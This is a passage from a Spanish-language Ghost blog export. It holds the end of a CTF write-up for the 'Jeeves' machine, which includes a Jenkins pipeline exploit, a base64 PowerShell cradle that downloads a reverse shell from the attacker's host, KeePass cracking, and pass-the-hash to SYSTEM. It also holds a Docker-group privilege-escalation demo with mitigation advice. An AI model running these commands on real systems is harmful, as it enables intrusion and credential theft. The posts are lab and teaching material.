encuentro un Jenkins de v2.87.\n\nEncontramos una vulnerabilidad con el pipeline de Jenkins para esa versión. Hacemos una prueba rápida colocando un comando en la ventana de configuración del pipeline.\n\nEs importante seleccionar el Sandbox de Groovy que es quien tiene la vulnerabilidad.\n\nPonemos en escucha tcpdump y vemos si hay respuesta cuando ejecutamos el pipeline.\n\nSe acontece la vulnerabilidad. Modificamos el script de arriba para que nos entable una reverse shell.\n\nPara ello, vamos a enviar a la consola de Powershell un código codificado en base64. El código en cuestión es el siguiente.\n\nIEX(New-Object Net.WebClient).downloadString('http://10.10.14.21/PS.ps1')\n\nEsto descargará un script desde nuestro equipo y lo ejecutará en el entorno remoto. Dicho script contiene una reverse shell descargada del repositorio de Nishang que modificaremos a nuestro gusto.\n\nLa forma de codificarlo a base64 pasa por cambiar el encoding a UTF-16LE si queremos tener en consideración a Microsoft. De lo contrario, probablemente no podrá ejecutar nuestro comando.\n\nEn general, Windows PowerShell tiene configurada la codificación UNICODE UTF-16LE de forma predeterminada.\n\nPara ello, ejecutamos el siguiente código.\n\n❯ echo \"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.21/PS.ps1')\">data\n❯ cat data | iconv -t utf-16le | xxd\n00000000: 4900 4500 5800 2800 4e00 6500 7700 2d00  I.E.X.(.N.e.w.-.\n00000010: 4f00 6200 6a00 6500 6300 7400 2000 4e00  O.b.j.e.c.t. .N.\n00000020: 6500 7400 2e00 5700 6500 6200 4300 6c00  e.t...W.e.b.C.l.\n00000030: 6900 6500 6e00 7400 2900 2e00 6400 6f00  i.e.n.t.)...d.o.\n00000040: 7700 6e00 6c00 6f00 6100 6400 5300 7400  w.n.l.o.a.d.S.t.\n00000050: 7200 6900 6e00 6700 2800 2700 6800 7400  r.i.n.g.(.'.h.t.\n00000060: 7400 7000 3a00 2f00 2f00 3100 3000 2e00  t.p.:././.1.0...\n00000070: 3100 3000 2e00 3100 3400 2e00 3200 3100  1.0...1.4...2.1.\n00000080: 2f00 5000 5300 2e00 7000 7300 3100 2700  /.P.S...p.s.1.'.\n00000090: 2900 0a00                                )...\n❯ cat data | iconv -t utf-16le | base64 -w0; echo\nSQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAMQAvAFAAUwAuAHAAcwAxACcAKQAKAA==powershell\n\nCopiamos el código final en base64 y lo adjuntamos a nuestro exploit del pipeline de Jenkins.\n\nnode {\n   powershell 'powershell -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAMQAvAFAAUwAuAHAAcwAxACcAKQAKAA=='\n}\n\nPonemos un servidor en nuestro equipo que acepte la descarga del script y en otra ventana netcat en escucha en el puerto 443.\n\nEjecutamos el pipeline en Jenkins.\n\nRecibimos la consola de nuestro lado.\n\n❯ rlwrap nc -nlvp 443\nlistening on [any] 443 ...\nconnect to [10.10.14.21] from (UNKNOWN) [10.10.10.63] 49685\nWindows PowerShell running as user kohsuke on JEEVES\nCopyright (C) 2015 Microsoft Corporation. All rights reserved.\n\nPS C:\\Users\\Administrator\\.jenkins\\workspace\\test> whoami\njeeves\\kohsuke\nPS C:\\Users\\Administrator\\.jenkins\\workspace\\test> cat C:\\Users\\kohsuke\\Desktop\\user.txt    \ne323xxxxxxxxxxxxxxxxxxxxxxxxxxx\n\nObtenemos la primera flag y continuamos con el escalado de privilegios.\n\nEn la carpeta documentos del usuario, descubrimos un archivo kdbx. Esta extensión pertenece a KeePass.\n\nPS C:\\Users\\kohsuke\\Documents>ls\nCEH.kdbx\n\nPara descargarnos el archivo a nuestro equipo, montamos un servidor samba.\n\n❯ impacket-smbserver smbFolder $(pwd) -smb2support\n\nY nos copiamos el archivo directamente en nuestro equipo.\n\nPS C:\\Users\\kohsuke\\Documents>copy CEH.kdbx \\\\10.10.14.21\\smbFolder\\CEH.kdbx\n\nPrimero obtenemos el hash de la contraseña con keepass2john, ejecutamos John The Ripper con el diccionario Rockyou que contiene más de 14 millones de las contraseñas más utilizadas y mostramos los resultados.\n\n❯ keepass2john CEH.kdbx > hash\n❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash\n❯ john -show hash\nCEH:mooxxxxx\n\nParece que los resultados han sido positivos. Usamos la contraseña para abrir el archivo kdbx en un cliente de KeePass como KeePassXC.\n\nLa entrada seleccionada en la imagen contiene una contraseña que parece ser un hash NTLM del usuario administrador. Validamos el hash con crackmapexec.\n\n❯ crackmapexec smb 10.10.10.63 -u \"Administrator\" -H \"e0fbxxxxxxxxxxxxxxxxxxx\"\nSMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)\nSMB         10.10.10.63     445    JEEVES           [+] Jeeves\\Administrator e0fbxxxxxxxxxxxxxxxx (Pwn3d!)\n\nComo aparece la palabra (Pwn3d!), confirmamos que el hash es correcto.\n\nA continuación, ejecutamos psexec.py para entablar una shell.\n\n❯ psexec.py WORKGROUP/administrator@10.10.10.63 -hashes :e0fbxxxxxxxxxxxxxxxxxxxxxx\nImpacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation\n\n...\nMicrosoft Windows [Version 10.0.10586]\n(c) 2015 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32> whoami\nnt authority\\system\n\nEstamos dentro como usuario Administrator y buscamos la flag.\n\nEn el escritorio encontramos un archivo que nos dice que lo que buscamos está en algún otro sitio más profundo.\n\nC:\\Users\\Administrator\\Desktop> type hm.txt\nThe flag is elsewhere.  Look deeper.\n\nNTFS tiene la posibilidad de almacenar la información en distintos streams de datos. Se puede encontrar más información aquí. Para enumerar todos los archivos/streams de archivos se emplea el parámetro /r.\n\nDespués, invocamos el comando more de Powershell para ver el siguiente stream de información.\n\nC:\\Users\\Administrator\\Desktop> dir /r\n Directory of C:\\Users\\Administrator\\Desktop\n\n11/08/2017  09:05 AM    <DIR>          .\n11/08/2017  09:05 AM    <DIR>          ..\n12/24/2017  02:51 AM                36 hm.txt\n                                    34 hm.txt:root.txt:$DATA\n\nC:\\Users\\Administrator\\Desktop> more < hm.txt:root.txt\nafbcxxxxxxxxxxxxxx",
            "feature_image": "__GHOST_URL__/content/images/2022/02/Jeeves.png",
            "featured": 0,
            "type": "post",
            "status": "published",
            "locale": null,
            "visibility": "public",
            "email_recipient_filter": "all",
            "created_at": "2022-02-12T16:53:54.000Z",
            "updated_at": "2022-02-13T22:12:32.000Z",
            "published_at": "2022-02-13T19:50:32.000Z",
            "custom_excerpt": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "custom_template": null,
            "canonical_url": null,
            "newsletter_id": null
          },
          {
            "id": "63a223c1005753014811237e",
            "uuid": "d54ff9ed-bd63-4f82-a385-6f66ee0f14b3",
            "title": "Docker puede ser un problema de seguridad en tu sistema",
            "slug": "docker-puede-ser-un-problema-de-seguridad",
            "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"embed\",{\"url\":\"https://www.youtube.com/watch?v=wW9CAH9nSLs\",\"html\":\"<iframe width=\\\"200\\\" height=\\\"150\\\" src=\\\"https://www.youtube.com/embed/wW9CAH9nSLs?feature=oembed\\\" frameborder=\\\"0\\\" allow=\\\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\\\" allowfullscreen></iframe>\",\"type\":\"video\",\"metadata\":{\"title\":\"The future of Linux Containers\",\"author_name\":\"dotcloudtv\",\"author_url\":\"https://www.youtube.com/user/dotcloudtv\",\"height\":150,\"width\":200,\"version\":\"1.0\",\"provider_name\":\"YouTube\",\"provider_url\":\"https://www.youtube.com/\",\"thumbnail_height\":360,\"thumbnail_width\":480,\"thumbnail_url\":\"https://i.ytimg.com/vi/wW9CAH9nSLs/hqdefault.jpg\"}}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/02/image-23.png\",\"width\":982,\"height\":123}],[\"code\",{\"language\":\"bash\",\"code\":\"──[root@parrot]─[/root]──># id\\nuid=0(root) gid=0(root) grupos=0(root)\"}],[\"code\",{\"language\":\"bash\",\"code\":\"──[demo@parrot]─[/home/demo]>$ id\\nuid=1001(demo) gid=1003(demo) grupos=1003(demo),1000(docker)\"}],[\"code\",{\"language\":\"bash\",\"code\":\"──[root@parrot]─[/home]──># ls -l\\ntotal 4\\ndrwxr-xr-x 1 demo demo 204 Feb 13 21:00 demo\\n-r-------- 1 root root  16 Feb 13 21:03 password.txt\\ndrwxr-xr-x 1 user user 614 Feb 13 19:53 user\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/02/image-24.png\",\"width\":578,\"height\":217}],[\"code\",{\"language\":\"bash\",\"code\":\"──[demo@parrot]─[~/demo]───>$ cat /home/password.txt \\ncat: /home/password.txt: Permiso denegado\"}],[\"code\",{\"language\":\"bash\",\"code\":\"──[demo@parrot]─[~/demo]───>$ docker run -v /:/vulnerable -it alpine /bin/sh\\nUnable to find image 'alpine:latest' locally\\nlatest: Pulling from library/alpine\\n59bf1c3509f3: Pull complete \\nDigest: sha256:21a3deaa0d32a8057914f36584b5288d2e5ecc984380bc0118285c70fa8c9300\\nStatus: Downloaded newer image for alpine:latest\\n/ #\"}],[\"code\",{\"language\":\"bash\",\"code\":\"/ # whoami\\nroot\\n/ # cat vulnerable/home/password.txt\\nP0wn3dP@ssw0rd!\"}]],\"markups\":[[\"em\"],[\"a\",[\"href\",\"https://es.wikipedia.org/wiki/Linus_Torvalds\"]],[\"a\",[\"href\",\"https://es.wikipedia.org/wiki/Robert_C._Martin\"]],[\"a\",[\"href\",\"https://martinfowler.com/\"]],[\"a\",[\"href\",\"https://es.wikipedia.org/wiki/Guido_van_Rossum\"]],[\"a\",[\"href\",\"https://blog.aquasec.com/a-brief-history-of-containers-from-1970s-chroot-to-docker-2016\"]],[\"strong\"],[\"a\",[\"href\",\"https://docs.docker.com/engine/install/ubuntu/\"]],[\"a\",[\"href\",\"https://docs.docker.com/engine/install/linux-postinstall/\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"Docker nació (o mejor dicho, fue presentado al público) en la PyCon de 2013 en una charla titulada \"],[0,[0],1,\"\\\"The future of Linux Containers\\\"\"],[0,[],0,\". Recomiendo ver el video que aparece a continuación (son menos de 6 minutos) y disfrutar del hecho de que en la informática, estamos viviendo lo que en un futuro será la \\\"historia del desarrollo de software\\\".\"]]],[1,\"p\",[[0,[],0,\"Y es que los \"],[0,[0],1,\"Albert Einstein\"],[0,[],0,\" del software como \"],[0,[0,1],1,\"Linus Torvalds\"],[0,[],0,\", \"],[0,[2],1,\"Robert C. Martin\"],[0,[],0,\", \"],[0,[3],1,\"Martin Fowler\"],[0,[],0,\", \"],[0,[4],2,\"Guido Van Rossum\"],[0,[],0,\" o muchos de los inventores de lenguajes de programación que se encuentran en el 99% del software que utilizamos, están vivos a día de hoy.\"]]],[10,0],[1,\"p\",[[0,[],0,\"Pero volviendo al tema de Docker. Docker no trajo consigo la tecnología de contenedores que se usa en Linux. Esto es algo que lleva existiendo desde \"],[0,[5],1,\"hace más de 20 años\"],[0,[],0,\" con diferentes nombres como Chroot en 1979, Jails en el 2000 y contenedores a partir de 2004. Pero no fue hasta el 2013 cuando esta tecnología se empezó a utilizar por la mayoría de la gente.\"]]],[1,\"p\",[[0,[],0,\"La verdadera ventaja que trajo Docker, fue la posibilidad de intercambiar imágenes de contenedores entre sistemas de una forma sencilla con los manifiestos Dockerfile y todo el ecosistema de alrededor. Pero no está libre de ser juzgado por mucha gente.\"]]],[1,\"p\",[[0,[6],1,\"Uno de los problemas que se le achaca a Docker es que Docker Daemon se ejecuta como Root.\"],[0,[],0,\" Y esto trae implicaciones indirectas como veremos a continuación.\"]]],[1,\"p\",[[0,[],0,\"Cuando instalamos Docker siguiendo el tutorial su \"],[0,[7],1,\"página oficial\"],[0,[],0,\", nos invita a seguir un proceso post-instalación en la \"],[0,[8],1,\"siguiente página\"],[0,[],0,\" donde nos enseñan que \"],[0,[6],1,\"podemos ejecutar Docker sin permisos de root, metiendo a un usuario normal al grupo de Docker\"],[0,[],0,\". Y es que aquí está la clave del problema. Podemos llegar a pensar que ejecutar Docker con un usuario normal es más seguro, cuando eso no cambia nada y de hecho, te da una sensación de seguridad que puede resultarte caro como veremos en la prueba de concepto.\"]]],[1,\"p\",[[0,[],0,\"Por romper una lanza a favor de ellos, en esa misma página podemos encontrar el cuadro a continuación.\"]]],[10,1],[1,\"p\",[[0,[],0,\"Y es que si, todos (o al menos yo alguna vez) solemos pasar por alto este tipo de mensajes si es que hemos llegado a verlos, porque en la mayoría de los blogs donde nos enseñan a instalar Docker en nuestro sistema directamente no nos previenen del riesgo de tener un usuario \\\"sin privilegios\\\" en el grupo de Docker. Además, \\\"eso de Daemon Attack Surface a mi me suena a chino\\\" 😎.\"]]],[1,\"h1\",[[0,[],0,\"Prueba de concepto\"]]],[1,\"h2\",[[0,[],0,\"1. Contexto del problema\"]]],[1,\"p\",[[0,[],0,\"Tenemos 2 usuarios en nuestro sistema, \"],[0,[6],1,\"root \"],[0,[],0,\"y \"],[0,[6],1,\"demo\"],[0,[],0,\".\"]]],[10,2],[10,3],[1,\"p\",[[0,[],0,\"Como vemos, demo está en el grupo Docker para poder lanzar contenedores y realizar su gestión. Como demo es un usuario con pocos privilegios, además, es un poco con el que solemos hacer todo pensando que así estamos más seguros.\"]]],[1,\"h2\",[[0,[],0,\"2. El archivo \\\"protegido\\\" de root\"]]],[1,\"p\",[[0,[],0,\"Hay un archivo en /home que se llama password.txt. Este archivo, en principio, tiene permisos 400 para que solo el usuario root pueda leer su contenido.\"]]],[10,4],[10,5],[1,\"p\",[[0,[],0,\"Si no conoces como funcionan los permisos de Linux no pasa nada, simplemente créete la siguiente afirmación de lo que ocurre.\"]]],[1,\"p\",[[0,[6],1,\"Ningún otro usuario, ni grupo del sistema, puede acceder al contenido del archivo password.txt con los permisos actuales.\"]]],[1,\"p\",[[0,[],0,\"Si aún así intentamos leer su contenido con el usuario demo, vemos el siguiente error.\"]]],[10,6],[1,\"p\",[[0,[],0,\"Hasta aquí todo bien, ¿correcto?\"]]],[1,\"h2\",[[0,[],0,\"3. Docker Daemon Attack Surface\"]]],[1,\"p\",[[0,[],0,\"A continuación, el usuario demo, el que no tenía privilegios, el que no podía leer el contenido de root, crea un contenedor del siguiente modo.\"]]],[10,7],[1,\"p\",[[0,[],0,\"Y una vez, dentro del contenedor, empieza la magia 🧙‍♂️.\"]]],[10,8],[1,\"p\",[[0,[],0,\"Es decir, un usuario sin privilegios, fuera del contexto de los contenedores no teníamos acceso a los archivos que root controlaba. \"]]],[1,\"p\",[[0,[],0,\"Dentro del contexto de los contenedores, si mapeamos en un volumen la raíz de todo el disco a una ruta del contenedor, tendremos control total de los archivos del sistema.\"]]],[1,\"h2\",[[0,[],0,\"4. Conclusión\"]]],[1,\"p\",[[0,[],0,\"¿Es el título del post clickbait? En parte sí. Más que una vulnerabilidad es un problema de no tener las cosas bien configuradas. \"]]],[1,\"p\",[[0,[],0,\"¿La página oficial de Docker podría explicar el problema o señalarlo de una mejor forma? Seguro que también.\"]]],[1,\"p\",[[0,[],0,\"La realidad es que ellos no tienen la culpa. En su misma página explican todo esto. Y la realidad también es que poca gente es conocedora de este problema de \\\"mala configuración\\\". Es responsabilidad de todos hacer pedagogía y explicarles a nuestros compañeros los riesgos que acarrea según que cosas y yo, con este post, dejo mi granito de arena.\"]]],[1,\"p\",[[0,[],0,\"¿Cómo deberías mitigar esto? Teniendo en mente que el usuario con el que gestionas Docker es como un usuario root. Protégelo con una buena contraseña y aíslalo del resto de cosas que haces en el sistema.\"]]]],\"ghostVersion\":\"4.0\"}",
            "lexical": null,
            "html": "<p>Docker nació (o mejor dicho, fue presentado al público) en la PyCon de 2013 en una charla titulada <em>\"The future of Linux Containers\"</em>. Recomiendo ver el video que aparece a continuación (son menos de 6 minutos) y disfrutar del hecho de que en la informática, estamos viviendo lo que en un futuro será la \"historia del desarrollo de software\".</p><p>Y es que los <em>Albert Einstein</em> del software como <em><a href=\"https://es.wikipedia.org/wiki/Linus_Torvalds\">Linus Torvalds</a>, <a href=\"https://es.wikipedia.org/wiki/Robert_C._Martin\">Robert C. Martin</a>, <a href=\"https://martinfowler.com/\">Martin Fowler</a>, <a href=\"https://es.wikipedia.org/wiki/Guido_van_Rossum\">Guido Van Rossum</a></em> o muchos de los inventores de lenguajes de programación que se encuentran en el 99% del software que utilizamos, están vivos a día de hoy.</p><figure class=\"kg-card kg-embed-card\"><iframe width=\"200\" height=\"150\" src=\"https://www.youtube.com/embed/wW9CAH9nSLs?feature=oembed\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe></figure><p>Pero volviendo al tema de Docker. Docker no trajo consigo la tecnología de contenedores que se usa en Linux. Esto es algo que lleva existiendo desde <a href=\"https://blog.aquasec.com/a-brief-history-of-containers-from-1970s-chroot-to-docker-2016\">hace más de 20 años</a> con diferentes nombres como Chroot en 1979, Jails en el 2000 y contenedores a partir de 2004. Pero no fue hasta el 2013 cuando esta tecnología se empezó a utilizar por la mayoría de la gente.</p><p>La verdadera ventaja que trajo Docker, fue la posibilidad de intercambiar imágenes de contenedores entre sistemas de una forma sencilla con los manifiestos Dockerfile y todo el ecosistema de alrededor. Pero no está libre de ser juzgado por mucha gente.</p><p><strong>Uno de los problemas que se le achaca a Docker es que Docker Daemon se ejecuta como Root.</strong> Y esto trae implicaciones indirectas como veremos a continuación.</p><p>Cuando instalamos Docker siguiendo el tutorial su <a href=\"https://docs.docker.com/engine/install/ubuntu/\">página oficial</a>, nos invita a seguir un proceso post-instalación en la <a href=\"https://docs.docker.com/engine/install/linux-postinstall/\">siguiente página</a> donde nos enseñan que <strong>podemos ejecutar Docker sin permisos de root, metiendo a un usuario normal al grupo de Docker</strong>. Y es que aquí está la clave del problema. Podemos llegar a pensar que ejecutar Docker con un usuario normal es más seguro, cuando eso no cambia nada y de hecho, te da una sensación de seguridad que puede resultarte caro como veremos en la prueba de concepto.</p><p>Por romper una lanza a favor de ellos, en esa misma página podemos encontrar el cuadro a continuación.</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/02/image-23.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"982\" height=\"123\" srcset=\"__GHOST_URL__/content/images/size/w600/2022/02/image-23.png 600w, __GHOST_URL__/content/images/2022/02/image-23.png 982w\" sizes=\"(min-width: 720px) 720px\"></figure><p>Y es que si, todos (o al menos yo alguna vez) solemos pasar por alto este tipo de mensajes si es que hemos llegado a verlos, porque en la mayoría de los blogs donde nos enseñan a instalar Docker en nuestro sistema directamente no nos previenen del riesgo de tener un usuario \"sin privilegios\" en el grupo de Docker. Además, \"eso de Daemon Attack Surface a mi me suena a chino\" 😎.</p><h1 id=\"prueba-de-concepto\">Prueba de concepto</h1><h2 id=\"1-contexto-del-problema\">1. Contexto del problema</h2><p>Tenemos 2 usuarios en nuestro sistema, <strong>root </strong>y <strong>demo</strong>.</p><pre><code class=\"language-bash\">──[root@parrot]─[/root]──&gt;# id\nuid=0(root) gid=0(root) grupos=0(root)</code></pre><pre><code class=\"language-bash\">──[demo@parrot]─[/home/demo]&gt;$ id\nuid=1001(demo) gid=1003(demo) grupos=1003(demo),1000(docker)</code></pre><p>Como vemos, demo está en el grupo Docker para poder lanzar contenedores y realizar su gestión. Como demo es un usuario con pocos privilegios, además, es un poco con el que solemos hacer todo pensando que así estamos más seguros.</p><h2 id=\"2-el-archivo-protegido-de-root\">2. El archivo \"protegido\" de root</h2><p>Hay un archivo en /home que se llama password.txt. Este archivo, en principio, tiene permisos 400 para que solo el usuario root pueda leer su contenido.</p><pre><code class=\"language-bash\">──[root@parrot]─[/home]──&gt;# ls -l\ntotal 4\ndrwxr-xr-x 1 demo demo 204 Feb 13 21:00 demo\n-r-------- 1 root root  16 Feb 13 21:03 password.txt\ndrwxr-xr-x 1 user user 614 Feb 13 19:53 user</code></pre><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/02/image-24.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"578\" height=\"217\"></figure><p>Si no conoces como funcionan los permisos de Linux no pasa nada, simplemente créete la siguiente afirmación de lo que ocurre.</p><p><strong>Ningún otro usuario, ni grupo del sistema, puede acceder al contenido del archivo password.txt con los permisos actuales.</strong></p><p>Si aún así intentamos leer su contenido con el usuario demo, vemos el siguiente error.</p><pre><code class=\"language-bash\">──[demo@parrot]─[~/demo]───&gt;$ cat /home/password.txt \ncat: /home/password.txt: Permiso denegado</code></pre><p>Hasta aquí todo bien, ¿correcto?</p><h2 id=\"3-docker-daemon-attack-surface\">3. Docker Daemon Attack Surface</h2><p>A continuación, el usuario demo, el que no tenía privilegios, el que no podía leer el contenido de root, crea un contenedor del siguiente modo.</p><pre><code class=\"language-bash\">──[demo@parrot]─[~/demo]───&gt;$ docker run -v /:/vulnerable -it alpine /bin/sh\nUnable to find image 'alpine:latest' locally\nlatest: Pulling from library/alpine\n59bf1c3509f3: Pull complete \nDigest: sha256:21a3deaa0d32a8057914f36584b5288d2e5ecc984380bc0118285c70fa8c9300\nStatus: Downloaded newer image for alpine:latest\n/ #</code></pre><p>Y una vez, dentro del contenedor, empieza la magia 🧙‍♂️.</p><pre><code class=\"language-bash\">/ # whoami\nroot\n/ # cat vulnerable/home/password.txt\nP0wn3dP@ssw0rd!</code></pre><p>Es decir, un usuario sin privilegios, fuera del contexto de los contenedores no teníamos acceso a los archivos que root controlaba. </p><p>Dentro del contexto de los contenedores, si mapeamos en un volumen la raíz de todo el disco a una ruta del contenedor, tendremos control total de los archivos del sistema.</p><h2 id=\"4-conclusi%C3%B3n\">4. Conclusión</h2><p>¿Es el título del post clickbait? En parte sí. Más que una vulnerabilidad es un problema de no tener las cosas bien configuradas. </p><p>¿La página oficial de Docker podría explicar el problema o señalarlo de una mejor forma? Seguro que también.</p><p>La realidad es que ellos no tienen la culpa. En su misma página explican todo esto. Y la realidad también es que poca gente es conocedora de este problema de \"mala configuración\". Es responsabilidad de todos hacer pedagogía y explicarles a nuestros compañeros los riesgos que acarrea según que cosas y yo, con este post, dejo mi granito de arena.</p><p>¿Cómo deberías mitigar esto? Teniendo en mente que el usuario con el que gestionas Docker es como un usuario root. Protégelo con una buena contraseña y aíslalo del resto de cosas que haces en el sistema.</p>",
            "comment_id": "6209620060d5f8006130f657",
            "plaintext": "Docker nació (o mejor dicho, fue presentado al público) en la PyCon de 2013 en una charla titulada \"The future of Linux Containers\". Recomiendo ver el video que aparece a continuación (son menos de 6 minutos) y disfrutar del hecho de que en la informática, estamos viviendo lo que en un futuro será la \"historia del desarrollo de software\".\n\nY es que los Albert Einstein del software como Linus Torvalds, Robert C. Martin, Martin Fowler, Guido Van Rossum o muchos de los inventores de lenguajes de programación que se encuentran en el 99% del software que utilizamos, están vivos a día de hoy.\n\nPero volviendo al tema de Docker. Docker no trajo consigo la tecnología de contenedores que se usa en Linux. Esto es algo que lleva existiendo desde hace más de 20 años con diferentes nombres como Chroot en 1979, Jails en el 2000 y contenedores a partir de 2004. Pero no fue hasta el 2013 cuando esta tecnología se empezó a utilizar por la mayoría de la gente.\n\nLa verdadera ventaja que trajo Docker, fue la posibilidad de intercambiar imágenes de contenedores entre sistemas de una forma sencilla con los manifiestos Dockerfile y todo el ecosistema de alrededor. Pero no está libre de ser juzgado por mucha gente.\n\nUno de los problemas que se le achaca a Docker es que Docker Daemon se ejecuta como Root. Y esto trae implicaciones indirectas como veremos a continuación.\n\nCuando instalamos Docker siguiendo el tutorial su página oficial, nos invita a seguir un proceso post-instalación en la siguiente página donde nos enseñan que podemos ejecutar Docker sin permisos de root, metiendo a un usuario normal al grupo de Docker. Y es que aquí está la clave del problema. Podemos llegar a pensar que ejecutar Docker con un usuario normal es más seguro, cuando eso no cambia nada y de hecho, te da una sensación de seguridad que puede resultarte caro como veremos en la prueba de concepto.\n\nPor romper una lanza a favor de ellos, en esa misma página podemos encontrar el cuadro a continuación.\n\nY es que si, todos (o al menos yo alguna vez) solemos pasar por alto este tipo de mensajes si es que hemos llegado a verlos, porque en la mayoría de los blogs donde nos enseñan a instalar Docker en nuestro sistema directamente no nos previenen del riesgo de tener un usuario \"sin privilegios\" en el grupo de Docker. Además, \"eso de Daemon Attack Surface a mi me suena a chino\" 😎.\n\n\nPrueba de concepto\n\n\n1. Contexto del problema\n\nTenemos 2 usuarios en nuestro sistema, root y demo.\n\n──[root@parrot]─[/root]──># id\nuid=0(root) gid=0(root) grupos=0(root)\n\n──[demo@parrot]─[/home/demo]>$ id\nuid=1001(demo) gid=1003(demo) grupos=1003(demo),1000(docker)\n\nComo vemos, demo está en el grupo Docker para poder lanzar contenedores y realizar su gestión. Como demo es un usuario con pocos privilegios, además, es un poco con el que solemos hacer todo pensando que así estamos más seguros.\n\n\n2. El archivo \"protegido\" de root\n\nHay un archivo en /home que se llama password.txt. Este archivo, en principio, tiene permisos 400 para que solo el usuario root pueda leer su contenido.\n\n──[root@parrot]─[/home]──># ls -l\ntotal 4\ndrwxr-xr-x 1 demo demo 204 Feb 13 21:00 demo\n-r-------- 1 root root  16 Feb 13 21:03 password.txt\ndrwxr-xr-x 1 user user 614 Feb 13 19:53 user\n\nSi no conoces como funcionan los permisos de Linux no pasa nada, simplemente créete la siguiente afirmación de lo que ocurre.\n\nNingún otro usuario, ni grupo del sistema, puede acceder al contenido del archivo password.txt con los permisos actuales.\n\nSi aún así intentamos leer su contenido con el usuario demo, vemos el siguiente error.\n\n──[demo@parrot]─[~/demo]───>$ cat /home/password.txt \ncat: /home/password.txt: Permiso denegado\n\nHasta aquí todo bien, ¿correcto?\n\n\n3. Docker Daemon Attack Surface\n\nA continuación, el usuario demo, el que no tenía privilegios, el que no podía leer el contenido de root, crea un contenedor del siguiente modo.\n\n──[demo@parrot]─[~/demo]───>$ docker run -v /:/vulnerable -it alpine /bin/sh\nUnable to find image 'alpine:latest' locally\nlatest: Pulling from library/alpine\n59bf1c3509f3: Pull complete \nDigest: sha256:21a3deaa0d32a8057914f36584b5288d2e5ecc984380bc0118285c70fa8c9300\nStatus: Downloaded newer image for alpine:latest\n/ #\n\nY una vez, dentro del contenedor, empieza la magia 🧙‍♂️.\n\n/ # whoami\nroot\n/ # cat vulnerable/home/password.txt\nP0wn3dP@ssw0rd!\n\nEs decir, un usuario sin privilegios, fuera del contexto de los contenedores no teníamos acceso a los archivos que root controlaba.\n\nDentro del contexto de los contenedores, si mapeamos en un volumen la raíz de todo el disco a una ruta del contenedor, tendremos control total de los archivos del sistema.\n\n\n4. Conclusión\n\n¿Es el título del post clickbait? En parte sí. Más que una vulnerabilidad es un problema de no tener las cosas bien configuradas.\n\n¿La página oficial de Docker podría explicar el problema o señalarlo de una mejor forma? Seguro que también.\n\nLa realidad es que ellos no tienen la culpa. En su misma página explican todo esto. Y la realidad también es que poca gente es conocedora de este problema de \"mala configuración\". Es responsabilidad de todos hacer pedagogía y explicarles a nuestros compañeros los riesgos que acarrea según que cosas y yo, con este post, dejo mi granito de arena.\n\n¿Cómo deberías mitigar esto? Teniendo en mente que el usuario con el que gestionas Docker es como un usuario root. Protégelo con una buena contraseña y aíslalo del resto de cosas que haces en el sistema.",
            "feature_image": "__GHOST_URL__/content/images/2022/02/docker.png",
            "featured": 0,
            "type": "post",
            "status": "published",
            "locale": null,
            "visibility": "public",
            "email_recipient_filter": "all",
            "created_at": "2022-02-13T19:54:40.000Z",
            "updated_at": "2022-12-30T23:28:07.000Z",
            "published_at": "2022-02-14T09:00:00.000Z",
            "custom_excerpt": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "custom_template": null,
            "canonical_url": null,
            "newsletter_id": null
          },
          {
            "id": "63a223c1005753014811237f",
            "uuid": "830c3d6b-e712-4029-9fb1-24f98497d6af",
            "title": "CTF - Epsilon WriteUp",
            "slug": "ctf-epsilon",
            "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[],\"markups\":[[\"a\",[\"href\",\"https://github.com/internetwache/GitTools\"]],[\"a\",[\"href\",\"https://jwt.io/\"]],[\"a\",[\"href\",\"https://pyjwt.readthedocs.io/en/stable/\"]],[\"a\",[\"href\",\"https://docs.aws.amazon.com/cli/latest/reference/lambda/list-functions.html\"]],[\"a\",[\"href\",\"https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---basic-injection\"]],[\"a\",[\"href\",\"https://github.com/DominicBreuker/pspy\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"gitools \"],[0,[0],1,\"https://github.com/internetwache/GitTools\"]]],[1,\"p\",[[0,[],0,\"jwt \"],[0,[1],1,\"https://jwt.io/\"],[0,[],0,\" \"],[0,[2],1,\"https://pyjwt.readthedocs.io/en/stable/\"]]],[1,\"p\",[[0,[],0,\"aws lambda \"],[0,[3],1,\"https://docs.aws.amazon.com/cli/latest/reference/lambda/list-functions.html\"]]],[1,\"p\",[[0,[],0,\"ssti \"],[0,[4],1,\"https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server Side Template Injection#jinja2---basic-injection\"]]],[1,\"p\",[[0,[],0,\"pspy 